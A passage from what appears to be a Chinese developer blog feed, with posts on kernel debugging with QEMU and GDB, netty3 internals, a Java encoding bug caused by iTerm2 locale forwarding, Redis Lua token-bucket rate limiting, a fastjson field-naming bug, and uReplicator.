alt=""></p><p>点击apply close即可。  </p><p>S11. 修复GDB问题<br>后面步骤用gdb远程调试时会报错： Remote ‘g’ packet reply is too long<br>先看下您的gdb的版本，然后下载相同版本进行修复并并编译。  </p><pre><code class="hljs shell">gdb -version wget http://ftp.gnu.org/gnu/gdb/gdb-7.11.1.tar.gz  tar -xzvf gdb-7.11.1.tar.gz  cd gdb-7.11.1vi gdb/remote.c</code></pre><p>将下面两行注释掉  </p><pre><code class="hljs c"><span class="hljs-comment">//  if (buf_len &gt; 2 * rsa-&gt;sizeof_g_packet)</span><span class="hljs-comment">//    error (_("Remote 'g' packet reply is too long: %s"), rs-&gt;buf);</span></code></pre><pre><code class="hljs shell">sudo ./configuresudo makesudo make install</code></pre><p>S12. 启动调试目标机并调试<br>qemu-system-x86_64 -s -S -kernel 004.code/linux-source-4.4.19/arch/x86_64/boot/bzImage -hda ~/005.vm/01.qemu/rootfs.img -append “root=/dev/sda”<br>cd 你的linux-4.4.19路径<br>gdb vmlinux<br>target remote localhost:1234<br>此时就应该连接上目标机器了。<br>b start_kernel<br>按gdb的c指令便可以使得调试目标机继续启动下去。<br>执行到内核启动时，断点便会被命中。  </p><p>S13. 在开发机用CDT调试。<br>重新启动调试目标机，这次不用gdb命令行的方式，用CDT可视化界面。<br>点击CDT工具栏中的绿色小虫子右边的箭头，选择1New_configuration，如果有什么错误提示不用理会，继续proceed。 连接成功后，控制台会有输出，也可以在控制台输入gdb调试指令，也可以在CDT上直接加断点。<br>这时你会发现在 start_kernel处停了下来。<br>F5 F6这些快捷键都可以用。</p>]]></content>
    
    
    <categories>
      
      <category>opensource-code-study</category>
      
    </categories>
    
    
    <tags>
      
      <tag>java</tag>
      
      <tag>linux内核源码分析</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>以http server为例简要分析netty3实现</title>
    <link href="/2020/04/24/netty3-hhttp-server/"/>
    <url>/2020/04/24/netty3-hhttp-server/</url>
    
    <content type="html"><![CDATA[<h2 id="概要"><a href="#概要" class="headerlink" title="概要"></a>概要</h2><p>最近看了点netty3实现。从webbit项目作为口子。<a href="https://github.com/webbit/webbit" target="_blank" rel="noopener">webbit</a>项目是一个基于netty3做的http与websocket server。后面还会继续看下netty4，netty4有很多改进，如其作者所说，有更少的GC，更丰富的SOCKET选项，更好的性能。此篇先谈netty3。</p><h2 id="ChannelBuffer-与-其特色工具类"><a href="#ChannelBuffer-与-其特色工具类" class="headerlink" title="ChannelBuffer 与 其特色工具类"></a>ChannelBuffer 与 其特色工具类</h2><p><img src="/img/opensource-code-study/127449-20190214074101713-262752191.png" srcset="/img/loading.gif" alt="01.netty3.6.5学习-ChannelBuffer 与netty3特色工具类分析"></p><h2 id="线程模型，事件分类，流水线"><a href="#线程模型，事件分类，流水线" class="headerlink" title="线程模型，事件分类，流水线"></a>线程模型，事件分类，流水线</h2><p><img src="/img/opensource-code-study/127449-20190214074106885-914632675.png" srcset="/img/loading.gif" alt="02.netty3.6.5学习-netty3线程模型与流水线"></p><h2 id="accpet请求与读请求"><a href="#accpet请求与读请求" class="headerlink" title="accpet请求与读请求"></a>accpet请求与读请求</h2><p><img src="/img/opensource-code-study/127449-20190214074112673-1353586236.png" srcset="/img/loading.gif" alt="03.netty3.6.5学习-接受客户端连接与读取客户端请求的流程"></p><h2 id="写出响应与webbit实现的关键类"><a href="#写出响应与webbit实现的关键类" class="headerlink" title="写出响应与webbit实现的关键类"></a>写出响应与webbit实现的关键类</h2><p><img src="/img/opensource-code-study/127449-20190214074118539-1876771199.png" srcset="/img/loading.gif" alt="04.netty3.6.5学习-向客户端写响应流程"></p>]]></content>
    
    
    <categories>
      
      <category>opensource-code-study</category>
      
    </categories>
    
    
    <tags>
      
      <tag>java</tag>
      
      <tag>netty3源码分析</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>应用默认编码不对的问题定位</title>
    <link href="/2020/04/24/app-encode-not-right/"/>
    <url>/2020/04/24/app-encode-not-right/</url>
    
    <content type="html"><![CDATA[<h3 id="应用默认编码不对的问题定位"><a href="#应用默认编码不对的问题定位" class="headerlink" title="应用默认编码不对的问题定位"></a>应用默认编码不对的问题定位</h3><h4 id="问题描述"><a href="#问题描述" class="headerlink" title="问题描述"></a>问题描述</h4><p>某日线上环境报警，分析后发现是java.lang.String.getBytes()方法在不同环境上表现出来的结果是不一样的。 </p><h4 id="JDK的String-getBytes-默认采用什么编码"><a href="#JDK的String-getBytes-默认采用什么编码" class="headerlink" title="JDK的String.getBytes()默认采用什么编码"></a>JDK的String.getBytes()默认采用什么编码</h4><p>看下JDK的代码不难发现：<br>先是靠<code>Charset.defaultCharset()</code>编码，如果不行靠<code>ISO-8859-1</code>兜底，再不行就直接应用退出了。</p><h4 id="Charset-defaultCharset的值取决于什么"><a href="#Charset-defaultCharset的值取决于什么" class="headerlink" title="Charset.defaultCharset的值取决于什么"></a>Charset.defaultCharset的值取决于什么</h4><p>看下JDK的代码不难发现先取<code>file.encoding</code>指定的编码，不行就拿<code>UTF-8</code>兜底。</p><h4 id="做实验验证两个环境"><a href="#做实验验证两个环境" class="headerlink" title="做实验验证两个环境"></a>做实验验证两个环境</h4><p>写个很简单的代码在环境上执行一下：  </p><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> </span>&#123;  System.out.println(System.getProperty(<span class="hljs-string">"file.encoding"</span>));  System.out.println(Charset.defaultCharset());&#125;</code></pre><p>结果发现AB两个环境都是：  </p><pre><code class="hljs shell">ANSI_X3.4-1968US-ASCII</code></pre><p>这就有点让人郁闷了，第一：应该是UTF-8才对啊，第二两个环境获取出来值的都一样，那么上面的String.getBytes()在两个环境上的结果也应该是一样的啊，应该将错就错啊。</p><p>查看两台机器的locale<br>A是：   </p><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> locale</span>LANG=en_US.UTF-8LC_CTYPE=UTF-8LC_NUMERIC="en_US.UTF-8"LC_TIME="en_US.UTF-8"LC_COLLATE="en_US.UTF-8"LC_MONETARY="en_US.UTF-8"LC_MESSAGES="en_US.UTF-8"LC_PAPER="en_US.UTF-8"LC_NAME="en_US.UTF-8"LC_ADDRESS="en_US.UTF-8"LC_TELEPHONE="en_US.UTF-8"LC_MEASUREMENT="en_US.UTF-8"LC_IDENTIFICATION="en_US.UTF-8"LC_ALL=</code></pre><p>B是  </p><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> locale</span>LANG=en_US.UTF-8LC_CTYPE=UTF-8LC_NUMERIC="en_US.UTF-8"LC_TIME="en_US.UTF-8"LC_COLLATE="en_US.UTF-8"LC_MONETARY="en_US.UTF-8"LC_MESSAGES="en_US.UTF-8"LC_PAPER="en_US.UTF-8"LC_NAME="en_US.UTF-8"LC_ADDRESS="en_US.UTF-8"LC_TELEPHONE="en_US.UTF-8"LC_MEASUREMENT="en_US.UTF-8"LC_IDENTIFICATION="en_US.UTF-8"LC_ALL=</code></pre><p>按理说都是UTF-8。    </p><p>继续检查应用进程的环境变量，确认看看有没有-D通过虚拟参数指定，检查后，结果是没有。<br>检查进程相关的环境变量，检查后，结果是没有。  </p><pre><code class="hljs shell">cat /proc/进程id/environ | tr '\0' '\n'</code></pre><p>用<code>locale charmap</code>命令确认AB两个环境：<br>得到的结果都是ANSI_X3.4-1968  </p><p>因为某个奇怪的原因在农神和我一起看这个问题的时候，我用了mac自带的终端工具连了跳板机，跳板机再连到AB量环境。上面我都是用的iterm2连的跳板机，然后再连的环境。<br>在我用mac自带的终端工具连环境时发现用来验证的那段简单的代码输出结果不是ANSI_X3.4-1968了，而是： </p><pre><code class="hljs shell">UTF-8  UTF-8</code></pre><p>我恍然大悟了，有问题那个环境，确实是去年冬天我用iterm2连接上然后手动重启的，没问的那个应用是ob3系统部署的。<br>看来问题是出在iterm2这个终端连接工具上了。  </p><h4 id="为iterm2会导致远端环境编码不对"><a href="#为iterm2会导致远端环境编码不对" class="headerlink" title="为iterm2会导致远端环境编码不对"></a>为iterm2会导致远端环境编码不对</h4><p>ssh连接的时候开启-v选项  </p><pre><code class="hljs shell">ssh -v xxx@yy.yyy.yyy.yy</code></pre><p>发现iterm2连接时是：  </p><pre><code class="hljs shell">debug1: Sending env LANG = en_US.UTF-8debug1: Sending env LC_CTYPE = UTF-8</code></pre><p>发现mac自带终端连接时是：  </p><pre><code class="hljs shell">debug1: Sending env LANG = zh_CN.UTF-8debug1: Sending env LC_CTYPE = zh_CN.UTF-8</code></pre><p>差异就是在这，LC_CTYPE送的值不一样，导致覆盖操作系统LC_CTYPE的值不一样，导致locale charmap不能识别，导致操作系统采用默认编码ANSI_X3.4-1968。<br>查到官方issue在这里，<a href="https://gitlab.com/gnachman/iterm2/issues/5478" target="_blank" rel="noopener">iTerm2 LC_CTYPE locale issue on SSH connections</a>，缺陷列表中@tsl0922 提到的版本新与我一致。 MacOS Mojave，iterm2 3.2.1。   </p><p>为iterm2发送了不一样的LC_CTYPE，因为在有问题的那个版本组合下：  </p><pre><code class="hljs shell">env |grep LC_CTYPELC_CTYPE = UTF-8</code></pre><p>升级到官方最新版本3.2.7，问题解决。<br>终端工具还能影响应用的编码，之前完全没往这个方向考虑。</p>]]></content>
    
    
    <categories>
      
      <category>program-language-practice</category>
      
    </categories>
    
    
    <tags>
      
      <tag>java</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>再写一篇tps限流</title>
    <link href="/2020/04/24/tps-again/"/>
    <url>/2020/04/24/tps-again/</url>
    
    <content type="html"><![CDATA[<h2 id="再写一篇tps限流"><a href="#再写一篇tps限流" class="headerlink" title="再写一篇tps限流"></a>再写一篇tps限流</h2><h3 id="各种限流算法的称呼"><a href="#各种限流算法的称呼" class="headerlink" title="各种限流算法的称呼"></a>各种限流算法的称呼</h3><p>网上有很多文章介绍限流算法，但是对于这些算法的称呼与描述也是有点难以理解。不管那么多了。我先按我理解的维度梳理一下。<br>主要维度是：是<em>正向计数</em>还是<em>反向计数</em>。是<em>定点(时间点)重置当前计数器</em>还是<em>每次接口调用时按量调整当前还剩的可用请求数</em>。  </p><h4 id="通俗理解"><a href="#通俗理解" class="headerlink" title="通俗理解"></a>通俗理解</h4><h5 id="正向计数且定点-时间点-重置的流程"><a href="#正向计数且定点-时间点-重置的流程" class="headerlink" title="正向计数且定点(时间点)重置的流程"></a>正向计数且定点(时间点)重置的流程</h5><pre><code class="hljs html">                       +-------------------------+                       |     init value = 0      |                       +-----------+-------------+                                   |                                   |                                   |             +---------------------v----------------------+             |          when request arrived              |      +------+ detect lastReqTime+interval &gt; currentTime  +------+      |      |                                            |      |      Y      +--------------------------------------------+      |      |                                                          N      |                                                          |+-----v-----------------------+                  +---------------v----------+|      reset value = 0        |                  |                          |+-----------------------------+                  |  detect value &gt; thresold |             |                             +-----+                          +----+             |                             |     +--------------------------+    |             |                             N                                     |             |                             |                                     |             |                             v                                     |             |                   +---------+---------+                           |             |                   |                   |                           Y             |                   | value = value + 1 |                           |             |                   |                   |                           |             |                   +--------+----------+                           |             |                            |                                      |             |                    +-------v---------+                +-----------v-----+             +-------------------&gt;+  return true    |                |  return false   |                                  +-----------------+                +-----------------+</code></pre><p>几个参数解释下：  </p><ol><li>value：当前时间段有多少请求进来了，即计数器的值  </li><li>interval： 每次刷新计数器的时间间隔  </li><li>lastReqTime: 上次请求进来的时间点  </li><li>currentTime：当前时间点  </li><li>thresold：时间间隔(interval)内请求数的最大阈值<br>这样设计，如果你的interval设置成1秒钟，thresold设置成1000，那么意思就是每秒限制1000请求数的流控。  相当于tps=1000限流。  </li></ol><h5 id="反向计数"><a href="#反向计数" class="headerlink" title="反向计数"></a>反向计数</h5><p>反向计数计数初始化value时不是初始化成0，而是初始化成thresold(你的限制请求数量的阈值)。<br>然后每次请求进来的时候 value不是+1而是-1，reset value的时候也是重置成thresold。</p><h5 id="定点重置的lua脚本"><a href="#定点重置的lua脚本" class="headerlink" title="定点重置的lua脚本"></a>定点重置的lua脚本</h5><pre><code class="hljs lua"><span class="hljs-comment">-- 资源唯一标识</span><span class="hljs-keyword">local</span> key = KEYS[<span class="hljs-number">1</span>]<span class="hljs-comment">-- 时间窗口内最大并发数</span><span class="hljs-keyword">local</span> max_permits = <span class="hljs-built_in">tonumber</span>(KEYS[<span class="hljs-number">2</span>])<span class="hljs-comment">-- 窗口的间隔时间</span><span class="hljs-keyword">local</span> interval_milliseconds = <span class="hljs-built_in">tonumber</span>(KEYS[<span class="hljs-number">3</span>])<span class="hljs-comment">-- 获取的并发数</span><span class="hljs-keyword">local</span> permits = <span class="hljs-built_in">tonumber</span>(ARGV[<span class="hljs-number">1</span>])<span class="hljs-keyword">local</span> current_permits = <span class="hljs-built_in">tonumber</span>(redis.call(<span class="hljs-string">"get"</span>, key) <span class="hljs-keyword">or</span> <span class="hljs-number">0</span>)<span class="hljs-comment">-- 如果超过了最大并发数，返回false</span><span class="hljs-keyword">if</span> (current_permits + permits &gt; max_permits) <span class="hljs-keyword">then</span>    <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span><span class="hljs-keyword">else</span>    <span class="hljs-comment">-- 增加并发计数</span>    redis.call(<span class="hljs-string">"incrby"</span>, key, permits)    <span class="hljs-comment">-- 如果key中保存的并发计数为0，说明当前是一个新的时间窗口，它的过期时间设置为窗口的过期时间</span>    <span class="hljs-keyword">if</span> (current_permits == <span class="hljs-number">0</span>) <span class="hljs-keyword">then</span>        redis.call(<span class="hljs-string">"pexpire"</span>, key, interval_milliseconds)    <span class="hljs-keyword">end</span>    <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span><span class="hljs-keyword">end</span></code></pre><h4 id="定点重置存在的问题"><a href="#定点重置存在的问题" class="headerlink" title="定点重置存在的问题"></a>定点重置存在的问题</h4><p>不论是正向计数还是反向计数，定点重置都存在一个问题：  </p><pre><code class="hljs html">        0r        1000r  1000r        0r0s               0.8s  1.0s  1.2              2.0s +----------------+-----+-----+----------------+-------&gt;timeline ^                ^     ^     ^                ^ |                |     |     |                | |                |     |     |                | |                |     |     |                | |                |     |     |                | +                +     +     +                +</code></pre><p>假设按上图时间线描述，0-0.8s系统没有收到请求，0.8-1.0s系统收到了1000个请求，1.0-1.2s系统又收到了1000个请求，1.2-2.0s系统收到了0个请求。这种场景其实是能通过上面的定点重置的流控的，但是实际在0.8s-1.2s这0.4s时间内tps达到了2000/(1.2-0.8)=5000的量，没能达到真正意义上的tps限流的述求。    </p><h4 id="每次接口调用时按量调整当前还剩的可用请求数且反向计数"><a href="#每次接口调用时按量调整当前还剩的可用请求数且反向计数" class="headerlink" title="每次接口调用时按量调整当前还剩的可用请求数且反向计数"></a>每次接口调用时按量调整当前还剩的可用请求数且反向计数</h4><p>这里先解释一下<em>按量</em>，按量就是：<br>假设上一次接口调用到这次接口调用间隔是2s，然后我们是1000tps限流，那么此时按量调整就是2sx1000r/s= +2000r。 也就是此时可用请求数按量加2000个。<br>整体逻辑比较复杂，先用java代码描述下：  </p><pre><code class="hljs java">-- keyString key = <span class="hljs-string">"流控实例id串"</span>; <span class="hljs-comment">// 通用代码，可以支持多个流控实例，控制不同的服务</span>-- 最大存储的令牌数<span class="hljs-keyword">int</span> max_permits = <span class="hljs-number">10000</span>;-- 每秒钟产生的令牌数<span class="hljs-keyword">int</span> permits_per_second = <span class="hljs-number">1000</span>; <span class="hljs-comment">// tps阈值</span>-- 请求的令牌数<span class="hljs-keyword">int</span> required_permits = <span class="hljs-number">1</span>; <span class="hljs-comment">// 请求数流控每次1个请求，如果是流量流控，可以从外面把这个传进来</span><span class="hljs-comment">// 存储流控逻辑中的数据用， 在redis中用hset代替。 [流控实例id串--&gt; [流程过程中需要的参数--&gt;参数值]]</span>Map&lt;String, Map&lt;String, Object&gt;&gt; storeMap = <span class="hljs-keyword">new</span> ConcurrentHashMap&lt;String, Map&lt;String, Object&gt;&gt;();-- 下次请求可以获取令牌的起始时间，初始值为<span class="hljs-number">0</span><span class="hljs-keyword">long</span> next_free_ticket_micros = storeMap.get(key).get(<span class="hljs-string">"next_free_ticket_micros"</span>) , <span class="hljs-keyword">default</span>: <span class="hljs-number">0</span> <span class="hljs-comment">// 取不到就用默认0</span>-- 当前时间<span class="hljs-keyword">long</span> now_micros = System.currentTimeMillis();-- 查询获取令牌是否超时<span class="hljs-keyword">if</span> (ARGV[<span class="hljs-number">1</span>] != <span class="hljs-keyword">null</span>) &#123;    -- 获取令牌的超时时间    <span class="hljs-keyword">long</span> timeout_micros = ARGV[<span class="hljs-number">1</span>];    <span class="hljs-keyword">long</span> micros_to_wait = next_free_ticket_micros - now_micros;    <span class="hljs-keyword">if</span> (micros_to_wait &gt; timeout_micros) &#123;        <span class="hljs-keyword">return</span> micros_to_wait    &#125;&#125;-- 当前存储的令牌数<span class="hljs-keyword">long</span> stored_permits = storeMap.get(key).get(<span class="hljs-string">"stored_permits"</span>) , <span class="hljs-keyword">default</span>: <span class="hljs-number">0</span> <span class="hljs-comment">// 取不到就用默认0</span>-- 添加令牌的时间间隔<span class="hljs-keyword">float</span> stable_interval_micros = <span class="hljs-number">1000</span> / permits_per_second;-- 补充令牌<span class="hljs-keyword">if</span> (now_micros &gt; next_free_ticket_micros) &#123;<span class="hljs-comment">/**</span><span class="hljs-comment"> * 当前时间 到 下次请求可以获取令牌的起始时间 之间差多少毫秒  就补 多少毫秒/产生单个可用令牌的毫秒数</span><span class="hljs-comment"> * 比如 1000tps 则产生1个令牌要1毫秒，假设 上面差50毫秒，那么就可以有50个新令牌可以用</span><span class="hljs-comment"> *</span><span class="hljs-comment"> **/</span>    <span class="hljs-keyword">long</span> new_permits = (now_micros - next_free_ticket_micros) / stable_interval_micros;    stored_permits = math.min(max_permits, stored_permits + new_permits);  <span class="hljs-comment">// 取最大令牌数  与 存储令牌数+新可用令牌数 小的一个</span>    next_free_ticket_micros = now_micros; <span class="hljs-comment">// 将当前时间更新为next_free_ticket_micros ，因为有新令牌能用了嘛</span>&#125;-- 消耗令牌<span class="hljs-keyword">long</span> moment_available = next_free_ticket_micros;<span class="hljs-keyword">long</span> stored_permits_to_spend = math.min(required_permits, stored_permits); <span class="hljs-comment">// 将要花掉多少令牌， 请求数控制的是1  取小的是因为不能超过可用令牌数</span><span class="hljs-keyword">long</span> fresh_permits = required_permits - stored_permits_to_spend; <span class="hljs-comment">// 这次用掉的，要减掉</span><span class="hljs-keyword">long</span> wait_micros = fresh_permits * stable_interval_micros; <span class="hljs-comment">// fresh_permits &gt; 0 表示申请的令牌不够，则需要等，乘以每个令牌需要的产生时间，就是要等多久</span><span class="hljs-comment">// redis.replicate_commands() // 在redis脚本中调用time会有问题的规避</span>storeMap.get(key).put(<span class="hljs-string">"stored_permits"</span>, stored_permits - stored_permits_to_spend);storeMap.get(key).put(<span class="hljs-string">"next_free_ticket_micros"</span>, next_free_ticket_micros + wait_micros);<span class="hljs-comment">// redis.call('expire', key, 10) // 每隔10s刷新一下这个流控实例</span>-- 返回需要等待的时间长度<span class="hljs-keyword">return</span> moment_available - now_micros;</code></pre><p>最后贴一下redis的lua脚本:  </p><pre><code class="hljs lua"><span class="hljs-comment">-- key</span><span class="hljs-keyword">local</span> key = KEYS[<span class="hljs-number">1</span>]<span class="hljs-comment">-- 最大存储的令牌数</span><span class="hljs-keyword">local</span> max_permits = <span class="hljs-built_in">tonumber</span>(KEYS[<span class="hljs-number">2</span>])<span class="hljs-comment">-- 每秒钟产生的令牌数</span><span class="hljs-keyword">local</span> permits_per_second = <span class="hljs-built_in">tonumber</span>(KEYS[<span class="hljs-number">3</span>])<span class="hljs-comment">-- 请求的令牌数</span><span class="hljs-keyword">local</span> required_permits = <span class="hljs-built_in">tonumber</span>(ARGV[<span class="hljs-number">1</span>])<span class="hljs-comment">-- 下次请求可以获取令牌的起始时间</span><span class="hljs-keyword">local</span> next_free_ticket_micros = <span class="hljs-built_in">tonumber</span>(redis.call(<span class="hljs-string">'hget'</span>, key, <span class="hljs-string">'next_free_ticket_micros'</span>) <span class="hljs-keyword">or</span> <span class="hljs-number">0</span>)<span class="hljs-comment">-- 当前时间</span><span class="hljs-keyword">local</span> <span class="hljs-built_in">time</span> = redis.call(<span class="hljs-string">'time'</span>)<span class="hljs-keyword">local</span> now_micros = <span class="hljs-built_in">tonumber</span>(<span class="hljs-built_in">time</span>[<span class="hljs-number">1</span>]) * <span class="hljs-number">1000000</span> + <span class="hljs-built_in">tonumber</span>(<span class="hljs-built_in">time</span>[<span class="hljs-number">2</span>])<span class="hljs-comment">-- 查询获取令牌是否超时</span><span class="hljs-keyword">if</span> (ARGV[<span class="hljs-number">2</span>] ~= <span class="hljs-literal">nil</span>) <span class="hljs-keyword">then</span>    <span class="hljs-comment">-- 获取令牌的超时时间</span>    <span class="hljs-keyword">local</span> timeout_micros = <span class="hljs-built_in">tonumber</span>(ARGV[<span class="hljs-number">2</span>])    <span class="hljs-keyword">local</span> micros_to_wait = next_free_ticket_micros - now_micros    <span class="hljs-keyword">if</span> (micros_to_wait &gt; timeout_micros) <span class="hljs-keyword">then</span>        <span class="hljs-keyword">return</span> micros_to_wait    <span class="hljs-keyword">end</span><span class="hljs-keyword">end</span><span class="hljs-comment">-- 当前存储的令牌数</span><span class="hljs-keyword">local</span> stored_permits = <span class="hljs-built_in">tonumber</span>(redis.call(<span class="hljs-string">'hget'</span>, key, <span class="hljs-string">'stored_permits'</span>) <span class="hljs-keyword">or</span> <span class="hljs-number">0</span>)<span class="hljs-comment">-- 添加令牌的时间间隔</span><span class="hljs-keyword">local</span> stable_interval_micros = <span class="hljs-number">1000000</span> / permits_per_second<span class="hljs-comment">-- 补充令牌</span><span class="hljs-keyword">if</span> (now_micros &gt; next_free_ticket_micros) <span class="hljs-keyword">then</span>    <span class="hljs-keyword">local</span> new_permits = (now_micros - next_free_ticket_micros) / stable_interval_micros    stored_permits = <span class="hljs-built_in">math</span>.<span class="hljs-built_in">min</span>(max_permits, stored_permits + new_permits)    next_free_ticket_micros = now_micros<span class="hljs-keyword">end</span><span class="hljs-comment">-- 消耗令牌</span><span class="hljs-keyword">local</span> moment_available = next_free_ticket_micros<span class="hljs-keyword">local</span> stored_permits_to_spend = <span class="hljs-built_in">math</span>.<span class="hljs-built_in">min</span>(required_permits, stored_permits)<span class="hljs-keyword">local</span> fresh_permits = required_permits - stored_permits_to_spend;<span class="hljs-keyword">local</span> wait_micros = fresh_permits * stable_interval_microsredis.replicate_commands()redis.call(<span class="hljs-string">'hset'</span>, key, <span class="hljs-string">'stored_permits'</span>, stored_permits - stored_permits_to_spend)redis.call(<span class="hljs-string">'hset'</span>, key, <span class="hljs-string">'next_free_ticket_micros'</span>, next_free_ticket_micros + wait_micros)redis.call(<span class="hljs-string">'expire'</span>, key, <span class="hljs-number">10</span>)<span class="hljs-comment">-- 返回需要等待的时间长度</span><span class="hljs-keyword">return</span> moment_available - now_micros</code></pre>]]></content>
    
    
    <categories>
      
      <category>program-language-practice</category>
      
    </categories>
    
    
    <tags>
      
      <tag>分布式系统</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>fastjosn在低版本丢字段问题</title>
    <link href="/2020/04/24/fastjson-low-version-lost-field/"/>
    <url>/2020/04/24/fastjson-low-version-lost-field/</url>
    
    <content type="html"><![CDATA[<p>简单的说：<br>对于java bean中有字段类似<code>pId</code>这种写法，特征是<code>第一个字母小写，第二个字母大写</code>，在eclipse中生成的getter setter方法是 getpId, setpId。<br>在低版本的fastjson，比如<code>1.1.41</code>中将java bean序列化成json字符串的时候，会丢掉pId这个字段。  使用高版本，比如<code>1.2.46</code>，就不会有这个问题。<br>那么，这到底是谁的锅？<br>先说结论，fastjson的锅。<br>先说，eclipse生成的对不对？生成的是对的，参见<a href="https://stackoverflow.com/questions/44066818/unexpectedly-generate-getter-and-setter-in-eclipse" target="_blank" rel="noopener">这里</a>  </p><blockquote><p>This is not the problem of eclipse it is the logic of getter and setter.  </p></blockquote><p>再说eclipse为什么要这么生成？因为符合<a href="https://download.oracle.com/otndocs/jcp/7224-javabeans-1.01-fr-spec-oth-JSpec/" target="_blank" rel="noopener">java bean规范</a><br>简单地说，getter setter方法是读取java bean字段的入口。 如果生成的是getPId和setPId，通过getter setter 方法拿到的属性字段名将是PId，不会是pId。为了能通过getter setter方法拿到的字段是pId，所以倒推出getter setter方法应该是getpId和setpId，<a href="https://stackoverflow.com/questions/40822397/why-does-propertydescriptor-return-a-property-name-with-uppercase-as-first-chara" target="_blank" rel="noopener">参见这里</a>  </p><blockquote><p>So when you have the introspection of a class that contains Long getRPersonId() and setRPersonId(Long), a property can be extracted from it. The name of the property generally follows from lower-casing the first letter, and keeping the rest unchanged. But this is not always the case, the exact rule is in paragraph 8.8:</p></blockquote><p>在高版本的fastjson中，不论写的是getpId还是getPId都不会丢字段。  </p><p>fastjson在<code>1.1.41</code>版本中有问题的获取代码如下:    </p><pre><code class="hljs java"><span class="hljs-keyword">if</span> (Character.isUpperCase(c3)) &#123;    <span class="hljs-keyword">if</span> (compatibleWithJavaBean) &#123;        propertyName = Introspector.decapitalize(methodName.substring(<span class="hljs-number">3</span>));    &#125; <span class="hljs-keyword">else</span> &#123;        propertyName = Character.toLowerCase(methodName.charAt(<span class="hljs-number">3</span>)) + methodName.substring(<span class="hljs-number">4</span>);    &#125;&#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (c3 == <span class="hljs-string">'_'</span>) &#123;    propertyName = methodName.substring(<span class="hljs-number">4</span>);&#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (c3 == <span class="hljs-string">'f'</span>) &#123;    propertyName = methodName.substring(<span class="hljs-number">3</span>);&#125; <span class="hljs-keyword">else</span> &#123;    <span class="hljs-keyword">continue</span>;&#125;</code></pre><p>fastjson在<code>1.1.42</code>版本中已经修复。<br><a href="https://github.com/alibaba/fastjson/blob/1.1.42/src/main/java/com/alibaba/fastjson/util/TypeUtils.java#L1009" target="_blank" rel="noopener">1.1.42的com.alibaba.fastjson.util.TypeUtils.computeGetters(Class&lt;?&gt;, Map&lt;String, String&gt;, boolean)</a></p><pre><code class="hljs java"><span class="hljs-keyword">if</span> (Character.isUpperCase(c3)) &#123;    <span class="hljs-keyword">if</span> (compatibleWithJavaBean) &#123;        propertyName = decapitalize(methodName.substring(<span class="hljs-number">3</span>));    &#125; <span class="hljs-keyword">else</span> &#123;        propertyName = Character.toLowerCase(methodName.charAt(<span class="hljs-number">3</span>)) + methodName.substring(<span class="hljs-number">4</span>);    &#125;&#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (c3 == <span class="hljs-string">'_'</span>) &#123;    propertyName = methodName.substring(<span class="hljs-number">4</span>);&#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (c3 == <span class="hljs-string">'f'</span>) &#123;    propertyName = methodName.substring(<span class="hljs-number">3</span>);&#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (methodName.length()&gt;=<span class="hljs-number">5</span> &amp;&amp; Character.isUpperCase(methodName.charAt(<span class="hljs-number">4</span>)))&#123;    propertyName = decapitalize(methodName.substring(<span class="hljs-number">3</span>));&#125;</code></pre><p>fastjson在<code>1.2.46</code>实现如下：<br><a href="https://github.com/alibaba/fastjson/blob/1.2.46/src/main/java/com/alibaba/fastjson/util/TypeUtils.java#L1320" target="_blank" rel="noopener">com.alibaba.fastjson.util.TypeUtils.buildBeanInfo(Class&lt;?&gt;, Map&lt;String, String&gt;, PropertyNamingStrategy, boolean)</a></p><pre><code class="hljs java">List&lt;FieldInfo&gt; fieldInfoList = fieldBased   ? computeGettersWithFieldBase(beanType, aliasMap, <span class="hljs-keyword">false</span>, propertyNamingStrategy) <span class="hljs-comment">//</span>   : computeGetters(beanType, jsonType, aliasMap, fieldCacheMap, <span class="hljs-keyword">false</span>, propertyNamingStrategy);</code></pre><p>已经有基于field还是基于getter setter来解析了。</p>]]></content>
    
    
    <categories>
      
      <category>program-language-practice</category>
      
    </categories>
    
    
    <tags>
      
      <tag>java</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>uReplicator实现分析</title>
    <link href="/2020/04/24/ureplicator-impl/"/>
    <url>/2020/04/24/ureplicator-impl/</url>
    
    <content type="html"><![CDATA[<h2 id="MirrorMakerWorker分析"><a href="#MirrorMakerWorker分析" class="headerlink" title="MirrorMakerWorker分析"></a>MirrorMakerWorker分析</h2><p>是整个同步机制的主入口，主要组织的逻辑有：</p><ul><li>配置数据的传入与处理，ConsumerConfig对象的构建</li><li>度量对象的准备，定时上报的度量数据收集线程的定义与启动</li><li>CompactConsumerFetcherManager实例的创建与startConnections</li><li>根据fetchNum创建KafkaConnector实例，KafkaConnector实例中会关联CompactConsumerFetcherManager实例</li><li>添加Helix Controller</li><li>添加优雅关闭的钩子</li><li>构造producer的config producerProps</li><li>根据维护KafkaConnector实例的connectorMap来创建MirrorMakerThread实例并启动</li><li>通过shutdownLatch: CountDownLatch来等待关闭退出main方法</li></ul><h3 id="与Helix关联的地方"><a href="#与Helix关联的地方" class="headerlink" title="与Helix关联的地方"></a>与Helix关联的地方</h3><p>实现HelixWorkerOnlineOfflineStateModelFactory和OnlineOfflineStateModel，OnlineOfflineStateModel可以理解成是一个监听器。实例在上下线切换时可以监听到。  </p><pre><code class="hljs scala">helixZkManager = <span class="hljs-type">HelixManagerFactory</span>.getZKHelixManager(helixClusterName, instanceId, <span class="hljs-type">InstanceType</span>.<span class="hljs-type">PARTICIPANT</span>, zkServer)<span class="hljs-keyword">val</span> stateMachineEngine: <span class="hljs-type">StateMachineEngine</span> = helixZkManager.getStateMachineEngine()<span 